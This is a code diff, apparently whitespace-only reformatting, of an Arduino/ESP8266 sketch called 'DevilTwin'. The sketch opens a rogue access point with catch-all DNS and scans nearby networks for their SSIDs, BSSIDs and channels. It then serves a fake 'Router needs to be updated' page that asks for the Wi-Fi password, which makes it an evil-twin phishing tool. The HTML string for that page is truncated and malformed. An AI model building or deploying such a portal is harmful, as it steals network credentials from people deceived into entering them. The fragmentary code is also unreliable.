@@ -8,7 +8,7 @@ typedef struct
   String ssid;
   uint8_t ch;
   uint8_t bssid[6];
-}  _Network;
+} _Network;
 
 const byte DNS_PORT = 53;
 IPAddress apIP(192, 168, 1, 1);
@@ -34,7 +34,7 @@ void setup() {
   WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
   WiFi.softAP("DevilTwin", "12345678");
   dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
-  performScan(); // Add this line to perform the network scan
+  performScan();  // Add this line to perform the network scan
   webServer.on("/", handleIndex);
   webServer.on("/result", handleResult);
   //webServer.on("/admin", handleAdmin);
@@ -52,7 +52,7 @@ void performScan() {
       network.ssid = WiFi.SSID(i);
       Serial.print("SSID: ");
       Serial.println(network.ssid);
-      
+
       Serial.print("BSSID: ");
       for (int j = 0; j < 6; j++) {
         network.bssid[j] = WiFi.BSSID(i)[j];
@@ -62,11 +62,11 @@ void performScan() {
         }
       }
       Serial.println();
-      
+
       network.ch = WiFi.channel(i);
       Serial.print("Channel: ");
       Serial.println(network.ch);
-      
+
       _networks[i] = network;
     }
   }
@@ -196,23 +196,23 @@ void handleIndex() {
       webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><h2>Updating, please wait...</h2></body> </html>");
     } else {
       webServer.send(200, "text/html", "<!DOCTYPE html> <html><body><h2>Router '" + _selectedNetwork.ssid + "' needs to be updatedPassword:  ");
-}
-}
+    }
+  }
 }
 
 String bytesToStr(uint8_t* data, uint8_t len) {
-String str = "";
-for (uint8_t i = 0; i < len; i++) {
-str += String(data[i], HEX);
-if (i < len - 1) {
-str += ":";
-}
-}
-return str;
+  String str = "";
+  for (uint8_t i = 0; i < len; i++) {
+    str += String(data[i], HEX);
+    if (i < len - 1) {
+      str += ":";
+    }
+  }
+  return str;
 }
 
 void loop() {
-webServer.handleClient();
-dnsServer.processNextRequest();
-delay(10);
+  webServer.handleClient();
+  dnsServer.processNextRequest();
+  delay(10);
 }
